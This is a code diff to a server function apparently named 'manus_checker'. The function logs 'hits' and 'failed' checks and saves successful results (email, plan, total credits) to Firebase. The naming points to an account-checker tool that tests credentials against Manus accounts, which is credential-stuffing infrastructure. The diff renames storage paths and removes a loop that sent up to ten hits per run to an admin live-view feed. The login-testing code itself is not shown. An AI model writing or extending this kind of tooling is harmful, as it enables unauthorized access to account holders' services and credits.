@@ -489,9 +489,9 @@ serve(async (req) => {
 
     console.log(`${getCanaryTimestamp()} [${requestId}] Complete: ${stats.success} hits, ${stats.failed} failed in ${durationStr}`);
 
-    // Save to Firebase (non-blocking) - using correct paths per Firebase rules
+    // Save to Firebase (non-blocking)
     if (userId) {
-      // Save history under checkHistory/$uid (per Firebase rules)
+      // Save full history
       firebasePush(`checkHistory/${userId}`, {
         service: "manus_checker",
         requestId,
@@ -514,9 +514,9 @@ serve(async (req) => {
         createdAt: new Date().toISOString()
       }).catch(e => console.error(`${getCanaryTimestamp()} [${requestId}] Firebase history save error:`, e));
 
-      // Save HITS separately under adminData (admin only path)
+      // Save HITS separately
       if (successResults.length > 0) {
-        firebasePush(`adminData/manusHits/${userId}`, {
+        firebasePush(`manusHits/${userId}`, {
           requestId,
           hits: successResults.map(r => ({
             email: r.email,
@@ -531,20 +531,6 @@ serve(async (req) => {
           count: successResults.length,
           checkedAt: new Date().toISOString()
         }).catch(e => console.error(`${getCanaryTimestamp()} [${requestId}] Firebase hits save error:`, e));
-
-        // Push to adminData/liveHits for admin real-time view
-        for (const hit of successResults.slice(0, 10)) {
-          firebasePush('adminData/liveHits', {
-            service: 'manus_checker',
-            username: username || 'anonymous',
-            hitData: {
-              email: hit.email,
-              plan: hit.plan,
-              totalCredits: hit.totalCredits,
-            },
-            createdAt: Date.now()
-          }).catch(() => {});
-        }
       }
     }
 
